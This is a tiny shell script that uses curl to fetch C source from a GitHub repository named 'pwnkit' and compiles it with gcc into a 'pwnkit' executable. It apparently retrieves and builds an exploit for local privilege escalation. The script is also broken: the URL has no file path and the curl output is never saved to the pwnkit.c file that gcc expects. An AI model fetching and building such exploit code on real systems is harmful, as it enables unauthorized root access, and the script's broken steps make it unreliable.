echo "Fetching C source..."
curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit
echo "Done."
echo "Creating ecxecutable..."
gcc -o pwnkit pwnkit.c
echo "Done."
